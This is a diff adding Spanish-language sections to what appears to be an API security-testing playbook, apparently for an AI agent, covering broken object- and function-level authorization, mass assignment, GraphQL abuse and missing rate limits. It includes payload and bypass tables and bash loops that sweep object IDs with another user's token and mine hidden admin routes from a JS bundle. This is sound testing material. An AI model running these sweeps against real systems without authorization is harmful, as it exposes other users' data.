@@ -104,6 +104,59 @@ chains_with: [broken-access-control, mass-assignment, rate-limiting]
 - Postman/Insomnia with environment-switching for multi-account replay.
 - `jq` for response diffing.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por primitiva de abuso de la API (no inyección, sino authz/exposición).
+Un `200` por sí solo es `Inferred`; confirmar que el body trae datos ajenos reales para `Demonstrated`.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| BOLA / IDOR | `GET /api/orders/{id}` con token de otro usuario | Acceso a objeto ajeno sin validación de ownership |
+| BFLA | Token low-priv contra endpoint admin (`DELETE /api/admin/users/55`) | Función privilegiada sin check server-side |
+| Verb switching | `PUT`/`PATCH`/`DELETE` donde el rol se chequea solo en `GET` | Método no cubierto por el guard |
+| Mass assignment | Body con claves extra `{"role":"admin","is_verified":true}` | Campos no esperados aceptados (chain mass-assignment) |
+| Excessive data exposure | Diff respuesta cruda vs UI: `password_hash`, `is_admin`, `ssn`, `reset_token` | API devuelve objeto completo, el frontend filtra |
+| GraphQL introspection | `{ __schema { types { name } } }` | Mapear schema oculto (recon, no finding por sí solo) |
+| GraphQL node/global-id | `{ node(id:"VXNlcjo1NQ==") { ... on User { email } } }` | IDOR vía global ID |
+| GraphQL batch/alias | Array de queries o aliases repetidos | Saltar rate limit per-request |
+| Rate-limit absence | `for i in $(seq 50); curl .../password/reset` | Endpoint sensible sin throttle (chain rate-limiting) |
+
+Surface signals que delatan la clase antes de atacar:
+- `/api/`, `/v1/`, `/v2/`, `/graphql`, `swagger.json`, `openapi.yaml`.
+- IDs numéricos/UUID en path/body; el mismo nombre de param en varios endpoints (ORM compartido).
+- Respuestas JSON con más campos que los que la UI renderiza.
+- Rutas admin presentes en el bundle JS pero ocultas en la UI.
+- Dos o más tiers de privilegio (user/admin, free/paid).
+
+```bash
+# BOLA sistémico: barrer un rango con token ajeno (no un one-off)
+for id in $(seq 1030 1050); do
+  code=$(curl -s -o /tmp/r_$id.json -w "%{http_code}" \
+    https://api.target.com/api/orders/$id -H "Authorization: Bearer $TOKEN_USER_B")
+  echo "$id -> $code"
+done
+```
+
+```bash
+# minar rutas admin ocultas del bundle antes de probar BFLA
+curl -s https://app.target.com/static/js/main.bundle.js \
+  | grep -oE '"/api/[a-zA-Z0-9/_-]+"' | sort -u
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.
+BFLA destructivo requiere gate del operador (ver project CLAUDE.md) antes de ejecutarse.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Authz solo en UI/router cliente | Llamar la API directo (bypass del front) | El guard no existe server-side |
+| Check de rol solo en `GET` | Verb switching `PUT/PATCH/DELETE` mismo path | Endpoints state-changing sin cubrir |
+| UUID impredecible | Filtrar IDs desde list endpoints / excessive data exposure | BOLA viable si el ownership no se valida igual |
+| Rate limit per-request | GraphQL batching/aliasing, multiplexing HTTP/2 | Un request, N operaciones |
+| 403 en ruta documentada | Probar sibling no documentado, `/v1` vs `/v2`, verbo alterno | Guard inconsistente entre versiones |
+| Serializer devuelve ORM completo | Leer los campos no renderizados en la respuesta cruda | DTO sin allow-list |
+
 ## Root Causes
 
 - Authorization checks performed only in the frontend/UI router, absent server-side.
